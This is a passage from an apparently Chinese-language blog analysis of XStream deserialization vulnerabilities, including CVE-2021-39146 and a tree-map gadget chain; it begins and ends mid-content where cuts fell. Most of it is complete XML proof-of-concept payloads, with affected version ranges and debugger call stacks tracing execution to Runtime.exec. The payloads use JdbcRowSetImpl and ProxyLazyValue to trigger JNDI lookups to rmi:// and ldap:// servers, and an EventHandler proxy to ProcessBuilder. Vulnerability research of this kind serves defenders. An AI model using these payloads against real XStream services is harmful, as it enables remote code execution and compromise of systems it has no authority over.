class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XRTreeFrag&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">m__dtm</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__size</span>&gt;</span>-10086<span class="tag">&lt;/<span class="name">m__size</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">__useServicesMechanism</span>&gt;</span>false<span class="tag">&lt;/<span class="name">__useServicesMechanism</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">m__incremental</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__incremental</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">m__source__location</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__source__location</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">m__defaultHandler</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__shouldStripWS</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__shouldStripWS</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__indexing</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__indexing</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__incrementalSAXSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">fPullParserConfig</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://127.0.0.1:1099/Basic/Command/calc<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">listeners</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">default</span>/&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">fPullParserConfig</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">name</span>&gt;</span>setAutoCommit<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">class</span>&gt;</span>boolean<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">fConfigParse</span> <span class="attr">reference</span>=<span class="string">&#x27;../fConfigSetInput&#x27;</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">fParseInProgress</span>&gt;</span>false<span class="tag">&lt;/<span class="name">fParseInProgress</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">m__incrementalSAXSource</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__walker</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nextIsRaw</span>&gt;</span>false<span class="tag">&lt;/<span class="name">nextIsRaw</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">m__walker</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__endDocumentOccured</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__endDocumentOccured</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__idAttributes</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__textPendingStart</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">m__textPendingStart</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__useSourceLocationProperty</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__useSourceLocationProperty</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__pastFirstElement</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__pastFirstElement</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">m__dtm</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">m__dtmIdentity</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmIdentity</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__dtmRoot</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmRoot</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__allowRelease</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__allowRelease</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">connect:615, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">parseSome:373, IncrementalSAXSource_Xerces (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">deliverMoreNodes:312, IncrementalSAXSource_Xerces (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">nextNode:814, SAX2DTM (com.sun.org.apache.xml.internal.dtm.ref.sax2dtm)</span><br><span class="line">_firstch:535, DTMDefaultBase (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">getStringValue:1294, SAX2DTM (com.sun.org.apache.xml.internal.dtm.ref.sax2dtm)</span><br><span class="line">str:207, XRTreeFrag (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">toString:314, XObject (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals:392, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">compareTo:441, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">compareTo:420, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">put:568, TreeMap (java.util)</span><br><span class="line">putAll:281, AbstractMap (java.util)</span><br><span class="line">putAll:327, TreeMap (java.util)</span><br><span class="line">populateTreeMap:122, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">unmarshal:94, TreeSetConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:65, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1157, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1141, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1021, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:19, Vul (POC.sortedSet)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/7fbb5d7fbb2a0d70870af431159c3d4d.png"></p><h3 id="CVE-2021-39146"><a href="#CVE-2021-39146" class="headerlink" title="CVE-2021-39146"></a>CVE-2021-39146</h3><h4 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h4><p>XStream &lt;&#x3D; 1.4.17</p><p>JDK &lt; 8u121（使用 RMI 进行 JNDI ）</p><p>JDK &lt; 8u191（使用 LADP 进行 JNDI ）</p><h4 id="版本说明-2"><a href="#版本说明-2" class="headerlink" title="版本说明"></a>版本说明</h4><p>无</p><h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞本质：还是 JNDI。source 点<code>javax.naming.ldap.Rdn.RdnEntry#compareTo</code>，通过 <code>&lt;sorted-set&gt;</code> 触发；sink 点是<code>java.security.PrivilegedAction#run</code>里有反射调用，设置成 <code>doLookup</code> 实现 JNDI。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/89c98bbbe4606a02235935ef4992d4ee.png"></p><figure class="highlight xml"><figcaption><span>title:"poc.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>test<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hashtable</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">loadFactor</span>&gt;</span>0.75<span class="tag">&lt;/<span class="name">loadFactor</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">threshold</span>&gt;</span>525<span class="tag">&lt;/<span class="name">threshold</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">int</span>&gt;</span>700<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">hashtable</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">defaultLocale</span>&gt;</span>zh_CN<span class="tag">&lt;/<span class="name">defaultLocale</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">resourceCache</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">javax.swing.MultiUIDefaults</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tables</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">hashtable</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">loadFactor</span>&gt;</span>0.75<span class="tag">&lt;/<span class="name">loadFactor</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">threshold</span>&gt;</span>525<span class="tag">&lt;/<span class="name">threshold</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>700<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>lazyValue<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">javax.swing.UIDefaults_-ProxyLazyValue</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">className</span>&gt;</span>javax.naming.InitialContext<span class="tag">&lt;/<span class="name">className</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>doLookup<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">args</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>ldap://127.0.0.1:1389/Basic/Command/calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">args</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults_-ProxyLazyValue</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">hashtable</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultLocale</span> <span class="attr">reference</span>=<span class="string">&#x27;../../../../../../../javax.swing.UIDefaults/default/defaultLocale&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">resourceCache</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tables</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">javax.swing.MultiUIDefaults</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>test<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>函数调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">start:1007, ProcessBuilder (java.lang)</span><br><span class="line">exec:620, Runtime (java.lang)</span><br><span class="line">exec:485, Runtime (java.lang)</span><br><span class="line">&lt;init&gt;:-1, Exploit_etYbcClocgwl</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:442, Class (java.lang)</span><br><span class="line">getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:189, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:1085, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:94, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">doLookup:290, InitialContext (javax.naming)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect) [2]</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">invoke:71, Trampoline (sun.reflect.misc)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect) [1]</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">invoke:275, MethodUtil (sun.reflect.misc)</span><br><span class="line">run:1107, UIDefaults$ProxyLazyValue$1 (javax.swing)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">createValue:1086, UIDefaults$ProxyLazyValue (javax.swing)</span><br><span class="line">getFromHashtable:216, UIDefaults (javax.swing)</span><br><span class="line">get:161, UIDefaults (javax.swing)</span><br><span class="line">get:64, MultiUIDefaults (javax.swing)</span><br><span class="line">toString:197, MultiUIDefaults (javax.swing)</span><br><span class="line">equals:392, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">compareTo:441, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">compareTo:420, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">put:568, TreeMap (java.util)</span><br><span class="line">putAll:281, AbstractMap (java.util)</span><br><span class="line">putAll:327, TreeMap (java.util)</span><br><span class="line">populateTreeMap:122, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">unmarshal:94, TreeSetConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:65, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1157, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1141, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1021, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:20, Vul (POC.sortedSet)</span><br></pre></td></tr></table></figure><h2 id="tree-map"><a href="#tree-map" class="headerlink" title="tree-map"></a>tree-map</h2><h3 id="影响范围-3"><a href="#影响范围-3" class="headerlink" title="影响范围"></a>影响范围</h3><p>XStream &#x3D;&#x3D; (1.4.0, 1.4.6]  &#x2F; 1.4.10</p><h3 id="版本说明-3"><a href="#版本说明-3" class="headerlink" title="版本说明"></a>版本说明</h3><ul><li>1.3.x 会直接报错，没有 compartor 属性</li><li>1.4.7 - 1.4.9 、1.4.11 都是对  EventHandler 这个handler类进行黑名单过滤。</li></ul><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这个同样是根标签解析到 TreeMap 这个 Converter，然后触发 compareTo，链子没变，但是覆盖版本更广了，POC如下</p><figure class="highlight xml"><figcaption><span>title:"poc.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--affected_version: XStream == (, 1.4.6] /  1.4.10--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tree-map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span 